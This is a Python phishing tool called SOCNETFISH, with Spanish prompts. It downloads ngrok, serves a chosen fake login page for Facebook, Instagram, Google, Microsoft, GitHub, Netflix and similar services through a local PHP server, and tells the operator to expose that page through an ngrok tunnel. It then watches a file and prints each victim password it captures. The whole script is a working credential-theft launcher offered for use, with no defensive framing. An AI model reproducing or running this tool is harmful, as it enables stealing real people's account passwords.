#!/usr/bin/python3
#SOCNETFISH V01
#Crate by WH117

import os
import stat
import zipfile
import requests

from signal import signal, SIGINT
from colorama import Fore, Back,init

init()

class hunter():
    def __init__(self):
        os.system('clear')
        self.banner()
    
    def handler(signal_received, frame):
        print("\n")
        resInput = input("Se precionó Ctrl+c. ¿Desea terminar Socnetfish ahora? y/n: ");
        if (resInput == 'y'):
            print(Back.RED + Fore.WHITE + "\n Saliendo de la aplicaicón " + Fore.RESET + Back.RESET)
            exit(0)
    
    signal(SIGINT, handler)

    def banner(self):
        print(Fore.RED)
        print("   _____ ____  _______   _____________________________ __  __ ")
        print("  / ___// __ \/ ____/ | / / ____/_  __/ ____/  _/ ___// / / / ")
        print("  \__ \/ / / / /   /  |/ / __/   / / / /_   / / \__ \/ /_/ /  ")
        print(" ___/ / /_/ / /___/ /|  / /___  / / / __/ _/ / ___/ / __  /   ")
        print("/____/\____/\____/_/ |_/_____/ /_/ /_/   /___//____/_/ /_/    ")
        print("\t\tBIENVENIDO A SOCNETFISH V01" + Fore.RESET)
        print("\t\t\tBy WH117")

        self.verificarNgrok()

        print(Fore.GREEN + "SELECCIONA UNA CATEGORÍA" + Fore.RESET)

        print("[" + Fore.RED + "1" + Fore.RESET + "] Facebook"  + "\t" + "[" + Fore.RED + "6" + Fore.RESET + "] Spotify")
        print("[" + Fore.RED + "2" + Fore.RESET + "] Instagram" + "\t" + "[" + Fore.RED + "7" + Fore.RESET + "] Microsoft")
        print("[" + Fore.RED + "3" + Fore.RESET + "] Twitter"   + "\t" + "[" + Fore.RED + "8" + Fore.RESET + "] GitHub")
        print("[" + Fore.RED + "4" + Fore.RESET + "] Google"    + "\t" + "[" + Fore.RED + "9" + Fore.RESET + "] SnapChat")
        print("[" + Fore.RED + "5" + Fore.RESET + "] Netflix"   + "\t" + "[" + Fore.RED + "0" + Fore.RESET + "] " + Fore.YELLOW + "Salir" + Fore.RESET)

        print(Fore.CYAN)
        self.numS = input("-> ")
        print(Fore.RESET)
        
        self.iniPhish(self.numS)

    def verificarNgrok(self):
        self.rutaNgrok = 'ngrok'
        
        if os.path.isfile(self.rutaNgrok):
            print("\t\t--Todo listo para iniciar--\n")
        else:
            self.urlNgrok = 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'

            print(Fore.YELLOW + "DESCARGANDO NGROK" + Fore.RESET)

            self.ngrokZip = requests.get(self.urlNgrok)

            open('ngrok.zip', 'wb').write(self.ngrokZip.content)

            print(Fore.GREEN + "DESCARGA FINALIZADA" + Fore.RESET)

            self.password = None
            self.ngzip = zipfile.ZipFile('ngrok.zip', "r")
            try:
                print(self.ngzip.namelist())

                self.ngzip.extractall(pwd=self.password, path='')

                print(Fore.YELLOW + "EL ARCHIVO SE DECOMPRIMIÓ CON ÉXITO" + Fore.RESET)

                self.ngzip.close()

                os.chmod(self.rutaNgrok, stat.S_IXUSR + stat.S_IRUSR + stat.S_IWUSR + stat.S_IRGRP + stat.S_IXGRP)
                os.system("rm -r ngrok.zip")
            except:
                print(Fore.RED + "OCURRIÓ UN ERROR DURANTE LA EXTRACCIÓN DE LOS ARCHIVOS" + Fore.RESET)

    def iniPhish(self, numSelect):
        if (numSelect == "1"):
            self.routePshih = "sites/facebook/"
            self.runingServerPhish(self.routePshih)
        elif (numSelect == "2"):
            self.routePshih = "sites/instagram/"
            self.runingServerPhish(self.routePshih)
        elif (numSelect == "3"):
            self.routePshih = "sites/twitter/"
            self.runingServerPhish(self.routePshih)
        elif (numSelect == "4"):
            self.routePshih = "sites/google/"
            self.runingServerPhish(self.routePshih)
        elif (numSelect == "5"):
            self.routePshih = "sites/netflix"
            self.runingServerPhish(self.routePshih)
        elif (numSelect == "6"):
            self.routePshih = "sites/spotify"
            self.runingServerPhish(self.routePshih)
        elif (numSelect == "7"):
            self.routePshih = "sites/microsoft"
            self.runingServerPhish(self.routePshih)
        elif (numSelect == "8"):
            self.routePshih = "sites/github"
            self.runingServerPhish(self.routePshih)
        elif (numSelect == "9"):
            self.routePshih = "sites/snapchat"
            self.runingServerPhish(self.routePshih)
        elif (numSelect == "0"):
            print(Back.RED + Fore.WHITE + "\n Saliendo de la aplicaicón " + Fore.RESET + Back.RESET)
            exit(0)
        else:
            print(Fore.RED + "SELECCIÓN NO ENCONTRADA" + Fore.RESET)

    def runingServerPhish(self, route):
        print(Fore.YELLOW + "INICIANDO SERVIDOR PHP..." + Fore.RESET)
        
        os.system("cd " + route + " && nohup php -S localhost:8080 &")
        
        print(Fore.GREEN + "SERVIDOR INICIADO CORRECTAMENTE: http://localhost:8080" + Fore.RESET)
        print(Fore.YELLOW + "A CONTINUACIÓN EJECUTE EL SIGUIENTE COMANDO EN UNA NUEVA VENTANA" + Fore.RESET)
        print(Fore.BLUE + "./ngrok http 8080" + Fore.RESET)
        print("EN ESPERA DE UNA CONTRASEÑA")
        
        self.passFile = "usernames.txt"

        if (os.path.isfile(self.passFile) == False):
            os.system("touch " + self.passFile)

        self.tamArchivoInicial = os.path.getsize(self.passFile)
        
        while(True):
            self.tamArchivoActual = os.path.getsize(self.passFile)
            self.fileAccount = open(self.passFile, 'r')
            self.readFileAccount = self.fileAccount.read()
            
            if (self.tamArchivoActual > self.tamArchivoInicial):
                os.system("clear")
            
                print(Fore.GREEN + "----- CONTRASEÑA CAPTURADA -----" + Fore.RESET)
                print(Fore.CYAN + self.readFileAccount + Fore.RESET)
            
                self.fileAccount.close()
            
                self.tamArchivoInicial = self.tamArchivoActual
            else:
                self.fileAccount.close()

if __name__ == '__main__':
    h = hunter()